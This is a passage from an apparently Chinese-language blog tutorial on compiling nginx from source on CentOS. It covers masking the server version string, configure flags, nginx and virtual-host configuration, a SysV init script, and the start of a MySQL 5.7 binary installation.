class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _NGINX_H_INCLUDED_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _NGINX_H_INCLUDED_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nginx_version      1013008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NGINX_VERSION      <span class="meta-string">"1.13.8"</span> <span class="comment">//版本号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NGINX_VER          <span class="meta-string">"nginx/"</span> NGINX_VERSION <span class="comment">//Nginx名称</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NGX_BUILD</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NGINX_VER_BUILD    NGINX_VER <span class="meta-string">" ("</span> NGX_BUILD <span class="meta-string">")"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NGINX_VER_BUILD    NGINX_VER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NGINX_VAR          <span class="meta-string">"NGINX"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NGX_OLDPID_EXT     <span class="meta-string">".oldbin"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _NGINX_H_INCLUDED_ */</span></span></span><br></pre></td></tr></table></figure><h3 id="ngx-http-header-filter-module-c"><a href="#ngx-http-header-filter-module-c" class="headerlink" title="ngx_http_header_filter_module.c"></a>ngx_http_header_filter_module.c</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www core]$ cd nginx-1.15.6/src/http</span><br><span class="line">[root@www http]$ vi ngx_http_header_filter_module.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) Igor Sysoev</span></span><br><span class="line"><span class="comment"> * Copyright (C) Nginx, Inc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ngx_config.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ngx_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ngx_http.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;nginx.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> ngx_int_t <span class="title">ngx_http_header_filter_init</span><span class="params">(<span class="keyword">ngx_conf_t</span> *cf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> ngx_int_t <span class="title">ngx_http_header_filter</span><span class="params">(<span class="keyword">ngx_http_request_t</span> *r)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">ngx_http_module_t</span>  ngx_http_header_filter_module_ctx = &#123;</span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* preconfiguration */</span></span><br><span class="line">    ngx_http_header_filter_init,           <span class="comment">/* postconfiguration */</span></span><br><span class="line"></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* create main configuration */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init main configuration */</span></span><br><span class="line"></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* create server configuration */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* merge server configuration */</span></span><br><span class="line"></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* create location configuration */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* merge location configuration */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ngx_module_t</span>  ngx_http_header_filter_module = &#123;</span><br><span class="line">    NGX_MODULE_V1,</span><br><span class="line">    &amp;ngx_http_header_filter_module_ctx,    <span class="comment">/* module context */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* module directives */</span></span><br><span class="line">    NGX_HTTP_MODULE,                       <span class="comment">/* module type */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init master */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init module */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init process */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* init thread */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* exit thread */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* exit process */</span></span><br><span class="line">    <span class="literal">NULL</span>,                                  <span class="comment">/* exit master */</span></span><br><span class="line">    NGX_MODULE_V1_PADDING</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_server_string[] = <span class="string">"Server: nginx"</span> CRLF; <span class="comment">//改这里</span></span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_server_full_string[] = <span class="string">"Server: "</span> NGINX_VER CRLF;</span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_server_build_string[] = <span class="string">"Server: "</span> NGINX_VER_BUILD CRLF;</span><br><span class="line">………………………………</span><br></pre></td></tr></table></figure><h3 id="ngx-http-special-response-c"><a href="#ngx-http-special-response-c" class="headerlink" title="ngx_http_special_response.c"></a>ngx_http_special_response.c</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www http]$ vi ngx_http_special_response.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Copyright (C) Igor Sysoev</span></span><br><span class="line"><span class="comment">* Copyright (C) Nginx, Inc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ngx_config.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ngx_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ngx_http.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;nginx.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> ngx_int_t <span class="title">ngx_http_send_error_page</span><span class="params">(<span class="keyword">ngx_http_request_t</span> *r,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">ngx_http_err_page_t</span> *err_page)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> ngx_int_t <span class="title">ngx_http_send_special_response</span><span class="params">(<span class="keyword">ngx_http_request_t</span> *r,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">ngx_http_core_loc_conf_t</span> *clcf, <span class="keyword">ngx_uint_t</span> err)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> ngx_int_t <span class="title">ngx_http_send_refresh</span><span class="params">(<span class="keyword">ngx_http_request_t</span> *r)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_error_full_tail[] =</span><br><span class="line"><span class="string">"&lt;hr&gt;&lt;center&gt;"</span> NGINX_VER <span class="string">"&lt;/center&gt;"</span> CRLF</span><br><span class="line"><span class="string">"&lt;/body&gt;"</span> CRLF</span><br><span class="line"><span class="string">"&lt;/html&gt;"</span> CRLF</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_error_build_tail[] =</span><br><span class="line"><span class="string">"&lt;hr&gt;&lt;center&gt;"</span> NGINX_VER_BUILD <span class="string">"&lt;/center&gt;"</span> CRLF</span><br><span class="line"><span class="string">"&lt;/body&gt;"</span> CRLF</span><br><span class="line"><span class="string">"&lt;/html&gt;"</span> CRLF</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_error_tail[] =</span><br><span class="line"><span class="string">"&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;"</span> CRLF <span class="comment">//改这里</span></span><br><span class="line"><span class="string">"&lt;/body&gt;"</span> CRLF</span><br><span class="line"><span class="string">"&lt;/html&gt;"</span> CRLF</span><br><span class="line">;</span><br></pre></td></tr></table></figure><h2 id="编译Nginx-1"><a href="#编译Nginx-1" class="headerlink" title="编译Nginx"></a>编译Nginx</h2><h2 id="下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305-Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持"><a href="#下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305-Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持" class="headerlink" title="下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305 Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持"></a>下面一步注意，如果你想搭建HTTPS站点，并想添加CHACHA20-Ploy1305 Cipher支持，请参考别的文章编译您的Nginx，以便和LiberSSL一起编译加入CHACHA20支持</h2><h2 id="在configure中可能遇到的问题："><a href="#在configure中可能遇到的问题：" class="headerlink" title="在configure中可能遇到的问题："></a>在configure中可能遇到的问题：</h2><ol><li>/configure: error: the HTTP rewrite module requires the PCRE library. You can either disable the module by using –without-http_rewrite_module option, or install the PCRE library into the system, or build the PCRE library statically from the source with nginx by using –with-pcre= option.</li></ol><p>解决办法：安装pcre-devel<br><code>yum -y install pcre-devel</code></p><ol start="2"><li>/configure: error: the HTTP gzip module requires the zlib library. You can either disable the module by using –without-http_gzip_module option, or install the zlib library into the system, or build the zlib library statically from the source with nginx by using –with-zlib= option.</li></ol><p>解决办法：安装zlib-devel<br><code>yum install -y zlib-devel</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www http]$ cd </span><br><span class="line">[root@www http]$ yum groupinstall "Development tools"</span><br><span class="line">[root@www http]$ yum -y install gcc wget gcc-c++ automake autoconf libtool libxml2-devel libxslt-devel perl-devel perl-ExtUtils-Embed pcre-devel openssl-devel</span><br><span class="line">[root@www http]$./configure \</span><br><span class="line">    --prefix=/usr/local/nginx \</span><br><span class="line">    --sbin-path=/usr/sbin/nginx \</span><br><span class="line">    --conf-path=/etc/nginx/nginx.conf \</span><br><span class="line">    --error-log-path=/var/log/nginx/error.log \</span><br><span class="line">    --http-log-path=/var/log/nginx/access.log \</span><br><span class="line">    --pid-path=/var/run/nginx.pid \</span><br><span class="line">    --lock-path=/var/run/nginx.lock \</span><br><span class="line">    --http-client-body-temp-path=/var/tmp/nginx/client \</span><br><span class="line">    --http-proxy-temp-path=/var/tmp/nginx/proxy \</span><br><span class="line">    --http-fastcgi-temp-path=/var/tmp/nginx/fcgi \</span><br><span class="line">    --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi \</span><br><span class="line">    --http-scgi-temp-path=/var/tmp/nginx/scgi \</span><br><span class="line">    --user=nginx \</span><br><span class="line">    --group=nginx \</span><br><span class="line">    --with-pcre \</span><br><span class="line">    --with-http_v2_module \</span><br><span class="line">    --with-http_ssl_module \</span><br><span class="line">    --with-http_realip_module \</span><br><span class="line">    --with-http_addition_module \</span><br><span class="line">    --with-http_sub_module \</span><br><span class="line">    --with-http_dav_module \</span><br><span class="line">    --with-http_flv_module \</span><br><span class="line">    --with-http_mp4_module \</span><br><span class="line">    --with-http_gunzip_module \</span><br><span class="line">    --with-http_gzip_static_module \</span><br><span class="line">    --with-http_random_index_module \</span><br><span class="line">    --with-http_secure_link_module \</span><br><span class="line">    --with-http_stub_status_module \</span><br><span class="line">    --with-http_auth_request_module \</span><br><span class="line">    --with-mail \</span><br><span class="line">    --with-mail_ssl_module \</span><br><span class="line">    --with-file-aio \</span><br><span class="line">    --with-threads \</span><br><span class="line">    --with-stream \</span><br><span class="line">    --with-stream_ssl_module</span><br><span class="line">[root@www nginx-1.15.6]$ make -j2 &amp;&amp; make install</span><br><span class="line">[root@www nginx-1.15.6]$ mkdir -pv /var/tmp/nginx/client</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p>进入conf目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ cd /etc/nginx/</span><br></pre></td></tr></table></figure><p>然后编辑nginx.conf为如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user nginx www;</span><br><span class="line">worker_processes  auto;</span><br><span class="line"></span><br><span class="line">#error_log  logs&#x2F;error.log;</span><br><span class="line">#error_log  logs&#x2F;error.log  notice;</span><br><span class="line">#error_log  logs&#x2F;error.log  info;</span><br><span class="line"></span><br><span class="line">pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">    #                  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">    #                  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location &#x2F; &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    #    location &#x2F; &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line">    #虚拟主机</span><br><span class="line">    include &#x2F;home&#x2F;wwwroot&#x2F;vhost&#x2F;*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到配置文件的最后一句，大家应该能想到这么做是为了多虚拟主机支持，可以分别管理每个虚拟主机的配置文件。当然如果你确定你的服务器上不会有第二个网站，也可以把server节配置都写到nginx.conf文件里。</p><h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><p>虚拟主机目录为：<code>/home/wwwroot/vhost/</code></p><p>Demo:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80; #监听端口</span><br><span class="line">    listen [::]:80; #IPV6支持</span><br><span class="line">    #listen 443 spdy; #https</span><br><span class="line">    #listen [::]:443 spdy; #IPV6 HTTPS</span><br><span class="line">    server_name www.example.com; #您的域名</span><br><span class="line">    index index.html index.php;</span><br><span class="line"></span><br><span class="line">    set $subdomain &#39;&#39;;</span><br><span class="line">    root  &#x2F;home&#x2F;www&#x2F;www.example.com$subdomain;</span><br><span class="line">    #include &#x2F;home&#x2F;www&#x2F;rewrite&#x2F;xxx.conf; #包含rewrite规则文件</span><br><span class="line">    </span><br><span class="line">    ### SSL 配置，如果您需要，请取消本段的注释并做好配置</span><br><span class="line">    #ssl on;</span><br><span class="line">    #ssl_protocols TLSv1.2 TLSv1.1 TLSv1;</span><br><span class="line">    #ssl_ciphers CHACHA20:GCM:CFB:HIGH:!DH:!RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains; preload&quot;;</span><br><span class="line">    #ssl_prefer_server_ciphers on;</span><br><span class="line">    #ssl_stapling on;</span><br><span class="line">    #ssl_stapling_verify on;</span><br><span class="line">    #ssl_certificate &#x2F;path&#x2F;to&#x2F;public.crt;</span><br><span class="line">    #ssl_certificate_key &#x2F;path&#x2F;to&#x2F;private.key;</span><br><span class="line">    ############</span><br><span class="line"></span><br><span class="line">    location ~ .*.php(&#x2F;.*)*$</span><br><span class="line">    &#123;</span><br><span class="line">        fastcgi_pass  unix:&#x2F;tmp&#x2F;php-cgi-www.example.com.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi.conf;</span><br><span class="line">        #fastcgi_param HTTPS $https if_not_empty; #如果是HTTPS站点请取消此行注释</span><br><span class="line">        fastcgi_param DOCUMENT_ROOT &#x2F;home&#x2F;wwwroot&#x2F;domain&#x2F;www.example.com$subdomain;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME  &#x2F;home&#x2F;wwwroot&#x2F;domain&#x2F;www.example.com$subdomain$fastcgi_script_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|flv|mp3|wma)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      30d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(js|css)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      12h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log off; </span><br><span class="line">    error_log &#x2F;dev&#x2F;null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加SysV-启动脚本"><a href="#添加SysV-启动脚本" class="headerlink" title="添加SysV 启动脚本"></a>添加SysV 启动脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ vim /etc/init.d/nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> nginx - this script starts and stops the nginx daemon </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chkconfig:   - 85 15 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> description: Nginx is an HTTP(S) server, HTTP(S) reverse \ </span></span><br><span class="line"><span class="meta">#</span><span class="bash">               proxy and IMAP/POP3 proxy server </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> processname: nginx </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> config:      /etc/nginx/nginx.conf </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> config:      /etc/sysconfig/nginx </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pidfile:     /var/run/nginx.pid </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Source <span class="keyword">function</span> library. </span></span><br><span class="line">. /etc/rc.d/init.d/functions</span><br><span class="line"><span class="meta">#</span><span class="bash"> Source networking configuration. </span></span><br><span class="line">. /etc/sysconfig/network</span><br><span class="line"><span class="meta">#</span><span class="bash"> Check that networking is up. </span></span><br><span class="line">[ "$NETWORKING" = "no" ] &amp;&amp; exit 0</span><br><span class="line">nginx="/usr/sbin/nginx"</span><br><span class="line">prog=$(basename $nginx)</span><br><span class="line">NGINX_CONF_FILE="/etc/nginx/nginx.conf"</span><br><span class="line">[ -f /etc/sysconfig/nginx ] &amp;&amp; . /etc/sysconfig/nginx</span><br><span class="line">lockfile=/var/lock/subsys/nginx</span><br><span class="line">start() &#123;</span><br><span class="line">    [ -x $nginx ] || exit 5</span><br><span class="line">    [ -f $NGINX_CONF_FILE ] || exit 6</span><br><span class="line">    echo -n $"Starting $prog: " </span><br><span class="line">    daemon $nginx -c $NGINX_CONF_FILE</span><br><span class="line">    retval=$?</span><br><span class="line">    echo </span><br><span class="line">    [ $retval -eq 0 ] &amp;&amp; touch $lockfile</span><br><span class="line">    return $retval</span><br><span class="line">&#125;</span><br><span class="line">stop() &#123;</span><br><span class="line">    echo -n $"Stopping $prog: " </span><br><span class="line">    killproc $prog -QUIT</span><br><span class="line">    retval=$?</span><br><span class="line">    echo </span><br><span class="line">    [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile</span><br><span class="line">    return $retval</span><br><span class="line">killall -9 nginx</span><br><span class="line">&#125;</span><br><span class="line">restart() &#123;</span><br><span class="line">    configtest || return $?</span><br><span class="line">    stop</span><br><span class="line">    sleep 1</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line">reload() &#123;</span><br><span class="line">    configtest || return $?</span><br><span class="line">    echo -n $"Reloading $prog: " </span><br><span class="line">    killproc $nginx -HUP</span><br><span class="line">RETVAL=$?</span><br><span class="line">    echo </span><br><span class="line">&#125;</span><br><span class="line">force_reload() &#123;</span><br><span class="line">    restart</span><br><span class="line">&#125;</span><br><span class="line">configtest() &#123;</span><br><span class="line"><span class="meta">$</span><span class="bash">nginx -t -c <span class="variable">$NGINX_CONF_FILE</span></span></span><br><span class="line">&#125;</span><br><span class="line">rh_status() &#123;</span><br><span class="line">    status $prog</span><br><span class="line">&#125;</span><br><span class="line">rh_status_q() &#123;</span><br><span class="line">    rh_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line">case "$1" in</span><br><span class="line">    start)</span><br><span class="line">        rh_status_q &amp;&amp; exit 0</span><br><span class="line">    $1</span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        rh_status_q || exit 0</span><br><span class="line">        $1</span><br><span class="line">        ;;</span><br><span class="line">    restart|configtest)</span><br><span class="line">        $1</span><br><span class="line">        ;;</span><br><span class="line">    reload)</span><br><span class="line">        rh_status_q || exit 7</span><br><span class="line">        $1</span><br><span class="line">        ;;</span><br><span class="line">    force-reload)</span><br><span class="line">        force_reload</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        rh_status</span><br><span class="line">        ;;</span><br><span class="line">    condrestart|try-restart)</span><br><span class="line">        rh_status_q || exit 0</span><br><span class="line">            ;;</span><br><span class="line">    *)</span><br><span class="line">      echo $"Usage: $0 &#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;" </span><br><span class="line">        exit 2</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>赋予脚本执行权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ chmod +x /etc/init.d/nginx</span><br></pre></td></tr></table></figure><p>添加至服务管理列表，设置开机启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ chkconfig --add nginx</span><br><span class="line">[root@www nginx-1.15.6]$ chkconfig  nginx on</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www nginx-1.15.6]$ service nginx start</span><br></pre></td></tr></table></figure><h1 id="编译安装MySQL"><a href="#编译安装MySQL" class="headerlink" title="编译安装MySQL"></a>编译安装MySQL</h1><p>依次执行以下命令检查系统中是否存在使用 rpm 安装的 MySQL 或者 MariaDB。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rpm -qa | grep mysql</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> rpm -qa | grep mariadb</span></span><br></pre></td></tr></table></figure><p>如果已经安装，则运行以下任一个命令删除。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rpm -e 软件名    <span class="comment">#注意：这里的软件名必须包含软件的版本信息，如rpm -e mariadb-libs-5.5.52-1.el7.x86_64。一般使用此命令即可卸载成功。</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> rpm -e --nodeps 软件名   <span class="comment">#卸载不成功时使用此命令强制卸载</span></span></span><br></pre></td></tr></table></figure><p>依次运行以下命令安装 MySQL。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install -y libaio-*    <span class="comment">#安装依赖</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p /usr/<span class="built_in">local</span>/mysql</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -xzvf mysql-5.7.24-el7-x86_64.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mv mysql-5.7.24-el7-x86_64/* /usr/<span class="built_in">local</span>/mysql/</span></span><br></pre></td></tr></table></figure><p>依次运行以下命令建立 mysql 组和用户，并将 mysql 用户添加到 mysql 组。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> groupadd mysql</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> useradd -g mysql -s /sbin/nologin mysql</span></span><br></pre></td></tr></table></figure><h2 id="运行命令初始化-MySQL-数据库。"><a href="#运行命令初始化-MySQL-数据库。" class="headerlink" title="运行命令初始化 MySQL 数据库。"></a>运行命令初始化 MySQL 数据库。</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> /usr/<span class="built_in">local</span>/mysql/bin/mysqld --initialize-insecure --datadir=/usr/<span class="built_in">local</span>/mysql/data/ --user=mysql</span></span><br></pre></td></tr></table></figure><p>这一步可能会报错：<code>/usr/local/mysql/bin/mysqld: error while loading shared libraries: libnuma.so.1: cannot open shared object file: No such file or directory</code><br>这是缺少numactl。这个时候运行<code>yum -y install numactl</code>就可以解决这个问题了. </p><h2 id="更改-mysql-安装目录的属性"><a href="#更改-mysql-安装目录的属性" class="headerlink" title="更改 mysql 安装目录的属性"></a>更改 mysql 安装目录的属性</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chown -R mysql:mysql /usr/<span class="built_in">local</span>/mysql</span></span><br></pre></td></tr></table></figure><h2 id="依次运行以下命令设置开机自启动"><a href="#依次运行以下命令设置开机自启动" class="headerlink" title="依次运行以下命令设置开机自启动"></a>依次运行以下命令设置开机自启动</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mysql/support-files/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp mysql.server  /etc/init.d/mysqld</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod +x /etc/init.d/mysqld</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chkconfig --add mysqld</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chkconfig  mysqld on</span></span><br></pre></td></tr></table></figure><h2 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /root/.bash_profile</span></span><br><span class="line">PATH=$PATH:$HOME/bin:/usr/local/mysql/bin:/usr/local/mysql/lib</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再原来的基础上加入mysql </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> /root/.bash_profile  <span class="comment">#重新执行文件</span></span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/ie8NFy8.jpg" alt=""></p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service mysqld start</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/hlKbZhw.jpg" alt=""></p><h1 id="编译安装PHP-fpm"><a href="#编译安装PHP-fpm" class="headerlink" 